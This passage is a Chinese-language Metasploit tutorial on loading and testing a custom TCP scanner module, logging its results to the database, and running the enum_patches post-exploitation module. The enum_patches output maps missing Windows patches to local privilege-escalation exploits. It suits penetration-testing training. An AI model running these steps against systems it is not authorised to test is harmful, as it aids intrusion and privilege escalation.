我们保存自己的模块在./modules/auxiliary/scanner/simple_tcp.rb，并且使用msfconsole加载。

这里有两点很重要，一是模块将在运行时加载，除非我们重启自己的接口否则我们的新模块将不能显示。第二是目录结构很重要，保存我们的扫描器在/modules/auxiliary/scanner/http/ 下时，他将显示为scanner/http/simple_tcp。

为了测试这个扫描器，我们启动一个netcat监听器：
```shell
root@kali:~# nc -lnvp 12345 < response.txt
listening on [any] 12345 ...
```

然后使用扫描器：
```shell
msf > use scanner/simple_tcp
msf auxiliary(simple_tcp) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf auxiliary(simple_tcp) > run

[*] Received: hello metasploit from 192.168.1.100
[*] Auxiliary module execution completed
```

### 从我们的扫描器中获取报告结果

- 检查活跃的数据库连接
- 检查重复记录
- 写记录到表格中

数据库驱动将被自动加载。
```db_driver postgres (or sqlite3, mysql)```

在扫描器代码中使用Auxiliary::Report mixin：
```include Msf::Auxiliary::Report```

然后调用report_note()方法：
```
report_note(
:host => rhost,
:type => "myscanner_password",
:data => data
)
```


## windows patch 枚举

### 枚举已安装的windows patch
如果目标是windows系统时，可以通过判断已经安装的patch，了解系统是否定期更新或发现漏洞。

MSF有个模块post/windows/gather/enum_patches可用于这个功能。

```shell

msf exploit(handler) > use post/windows/gather/enum_patches
msf post(enum_patches) > show options

Module options (post/windows/gather/enum_patches):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   KB         KB2871997, KB2928120  yes       A comma separated list of KB patches to search for
   MSFLOCALS  true                  yes       Search for missing patchs for which there is a MSF local module
   SESSION                          yes       The session to run this module on.
```

该模块的高级选项，可以使用```show advanced```查看：
```shell
msf post(enum_patches) > show advanced

Module advanced options (post/windows/gather/enum_patches):

   Name           : VERBOSE
   Current Setting: true
   Description    : Enable detailed status messages

   Name           : WORKSPACE
   Current Setting: 
   Description    : Specify the workspace for this module
```

一旦使用Windows目标启动了一个抄表器会话，请加载enum_patches模块并设置“ SESSION”选项。完成后，使用run命令将针对我们的目标启动该模块。

```shell
msf post(enum_patches) > show options

Module options (post/windows/gather/enum_patches):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   KB         KB2871997, KB2928120  yes       A comma separated list of KB patches to search for
   MSFLOCALS  true                  yes       Search for missing patchs for which there is a MSF local module
   SESSION    1                     yes       The session to run this module on.

msf post(enum_patches) > run

[*] KB2871997 applied
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[*] KB2305420 applied
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
[*] Post module execution completed
```
